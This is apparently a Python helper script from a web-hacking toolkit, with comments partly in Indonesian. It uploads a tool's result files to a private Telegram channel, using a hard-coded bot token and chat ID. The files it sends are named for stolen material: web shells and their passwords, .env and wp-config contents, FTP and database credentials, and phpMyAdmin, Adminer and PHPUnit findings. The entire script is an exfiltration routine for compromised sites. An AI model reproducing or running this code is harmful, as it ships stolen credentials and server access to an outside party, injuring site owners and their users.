# module
import sys, os
import requests as x

# auto sender result xmlrpc to your priv channel telegram by @soul_kings & @rzzkyo

try:
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendMessage?chat_id=-1001774046604&text=.')
except Exception as e:
    print(e)
try:
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendMessage?chat_id=-1001774046604&text=[———— SETOR RESULT BOT ————]')
except:
    pass
try:
    files = {'document':open('result/shell.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/phpinfo.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/shellpw.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/shellcracked.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/env.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/kcfinder.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/wpconfig.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/db_no_localhost.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/ftp.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/RFM.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/phpmyadmin.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/phpunit.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    files = {'document':open('result/adminer.txt', 'rb') } # isi filename yg mau dikirim
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendDocument?chat_id=-1001774046604', files=files) # isi token & chat idnya
except:
    pass
try:
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendMessage?chat_id=-1001774046604&text=[————————— END —————————]')
except:
    pass
try:
    x.post('https://api.telegram.org/bot1935614623:AAGVDvlMHfvgEsMkgHF6y8xvP8_UkNNJnYA/sendMessage?chat_id=-1001774046604&text=.')
except:
    pass